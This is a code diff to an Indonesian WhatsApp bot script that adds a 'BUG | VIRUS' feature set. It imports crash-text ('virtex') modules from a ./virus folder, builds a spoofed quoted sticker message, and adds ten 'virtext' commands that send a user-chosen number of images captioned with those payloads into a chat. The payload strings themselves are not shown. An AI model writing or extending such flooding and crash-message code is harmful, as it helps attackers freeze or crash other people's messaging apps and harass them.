@@ -33,6 +33,18 @@ const { jadwaltv }= require('./lib/jadwaltv')
 const xeontod = require("tod-api")
 const { pinterest } = require("./lib/pinterest")
 const toHur = require('@develoka/angka-terbilang-js')
+const { virtex, vipi } = require('./virus/virtex/virtex.js')
+const { ngazap } = require('./virus/virtex/ngazap')
+const { buttonvirus } = require('./virus/virtex/buttonvirus')
+const { buttonkal } = require('./virus/virtex/buttonkal')
+const { bugsw } = require('./virus/virtex/bugsw')
+const { iphone } = require('./virus/virtex/iphone')
+const { iphone1 } = require('./virus/virtex/iphone1')
+const { iphone2 } = require('./virus/virtex/iphone2')
+const { iphone3 } = require('./virus/virtex/iphone3')
+const { iphone4 } = require('./virus/virtex/iphone4')
+const { iphone5 } = require('./virus/virtex/iphone5')
+const { iphone6 } = require('./virus/virtex/iphone6')
 const { apidanz } = JSON.parse(fs.readFileSync('./apidanz.js'))
 const { lolkey } = JSON.parse(fs.readFileSync('./lolkey.js'))
 const { frkey } = JSON.parse(fs.readFileSync('./frkey.js'))
@@ -293,7 +305,24 @@ if (!('templateVideo' in setting)) setting.templateVideo = false
         } catch (err) {
             console.error(err)
         }
-	
+	// VIRUS DOC
+	const doc = { 
+key: {
+fromMe: false, 
+participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
+},
+"message": {
+"stickerMessage": {
+"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
+"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
+"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
+"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
+"mimetype": "image/webp",
+"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
+"fileLength": "14240",
+"mediaKeyTimestamp": "1664991742",
+"isAnimated": false
+}}}
 	// FAKE TEXT IMG
 const textImg = (teks) => {
 XeonBotInc.sendMessage(m.chat, { text :teks, }, {quoted: m, thumbnail: fs.readFileSync('./XeonMedia/image/wpmobile.png')}) 
@@ -495,7 +524,7 @@ jumlahharian = `${dataa.value}`
 	    let setting = global.db.data.settings[botNumber]
 	    if (new Date() * 1 - setting.status > 100) {
 		const run = runtime(process.uptime())
-		await XeonBotInc.setStatus(`Untuk memulai ketik menu, untuk donasi ketik donasi| ${XeonBotInc.user.name} | Waktu Bot Berjalan : 66666${run}`)
+		await XeonBotInc.setStatus(`Untuk memulai ketik menu, untuk donasi ketik donasi | ${XeonBotInc.user.name} | Waktu Bot Berjalan : 66666${run}`)
 		setting.status = new Date() * 1
 	    }
 	}
@@ -4887,6 +4916,87 @@ Detek = tes.translate
 replay(`🌐Translate : ${Detek}\n📘Results : ${Infoo}`)
 }
 break
+case 'virtext1': {
+if (args.length == 0) return m.reply(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+XeonBotInc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/3951f34e7d99b8986f20b.jpg' }, caption: `${iphone}` }, { quoted: doc })
+}
+}
+break
+case 'virtext2': {
+if (args.length == 0) return m.reply(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+XeonBotInc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/3951f34e7d99b8986f20b.jpg' }, caption: `${iphone1}` }, { quoted: doc })
+}
+}
+break
+case 'virtext3': {
+if (args.length == 0) return m.reply(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+XeonBotInc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/3951f34e7d99b8986f20b.jpg' }, caption: `${iphone2}` }, { quoted: doc })
+}
+}
+break
+case 'virtext4': {
+if (args.length == 0) return m.reply(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+XeonBotInc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/3951f34e7d99b8986f20b.jpg' }, caption: `${iphone3}` }, { quoted: doc })
+}
+}
+break
+case 'virtext5': {
+if (args.length == 0) return m.reply(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+XeonBotInc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/3951f34e7d99b8986f20b.jpg' }, caption: `${iphone4}` }, { quoted: doc })
+}
+}
+break
+case 'virtext6': {
+if (args.length == 0) return m.reply(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+XeonBotInc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/3951f34e7d99b8986f20b.jpg' }, caption: `${iphone5}` }, { quoted: doc })
+}
+}
+break
+case 'virtext7': {
+if (args.length == 0) return m.reply(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+XeonBotInc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/3951f34e7d99b8986f20b.jpg' }, caption: `${iphone6}` }, { quoted: doc })
+}
+}
+break
+case 'virtext8': {
+if (args.length == 0) return m.reply(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+XeonBotInc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/3951f34e7d99b8986f20b.jpg' }, caption: `${buttonkal}` }, { quoted: doc })
+}
+}
+break
+case 'virtext9': {
+
+if (args.length == 0) return m.reply(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+XeonBotInc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/3951f34e7d99b8986f20b.jpg' }, caption: `${buttonvirus}` }, { quoted: doc })
+}
+}
+break
+case 'virtext10': {
+if (args.length == 0) return m.reply(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+XeonBotInc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/3951f34e7d99b8986f20b.jpg' }, caption: `${ngazap(prefix)}`}, { quoted: doc })
+}
+}
+break
 case 'sound1':
 case 'sound2':
 case 'sound3':
@@ -9201,6 +9311,17 @@ return reply(`╔═══════✪「 OWNER 」
 ╠${prefix}upvote
 ╠${prefix}checkvote
 ╠${prefix}delvote
+╠═════════✪「 BUG | VIRUS 」	
+╠${prefix}virtext1 [ jumlah ]
+╠${prefix}virtext2 [ jumlah ]
+╠${prefix}virtext3 [ jumlah ]
+╠${prefix}virtext4 [ jumlah ]
+╠${prefix}virtext5 [ jumlah ]
+╠${prefix}virtext6 [ jumlah ]
+╠${prefix}virtext7 [ jumlah ]
+╠${prefix}virtext8 [ jumlah ]
+╠${prefix}virtext9 [ jumlah ]
+╠${prefix}virtext10 [ jumlah ]
 ╠═════════✪「 RPG 」	
 ╠${prefix}hunt
 ╠${prefix}mine
@@ -9318,7 +9439,7 @@ return reply(`╔═══════✪「 OWNER 」
 ╠ ${prefix}halloween
 ╠ ${prefix}watercolor
 ╠ ${prefix}classic
-╠═════✪「 DOWNLOAD 」	[FOR NOW, ONLY TIKTOK IS WORKING]
+╠═════✪「 DOWNLOAD 」
 ╠${prefix}instagram [url]
 ╠${prefix}igtv [url]
 ╠${prefix}igstory [username]
@@ -9521,7 +9642,7 @@ return reply(`╔═══════✪「 OWNER 」
 ╠${prefix}cringe
 ╠${prefix}neko
 ╠${prefix}gura
-╠═══════✪「 SFW 」
+╠═══════✪「 SFW | ALL BROKEN 」
 ╠${prefix}uniform
 ╠${prefix}maid
 ╠${prefix}waifu2
@@ -9530,7 +9651,7 @@ return reply(`╔═══════✪「 OWNER 」
 ╠${prefix}raiden
 ╠${prefix}oppai
 ╠${prefix}selfies
-╠═══════✪「 NSFW 」
+╠═══════✪「 NSFW | ALL BROKEN 」
 ╠${prefix}hentaivideo
 ╠${prefix}nyuri
 ╠${prefix}nyaoi
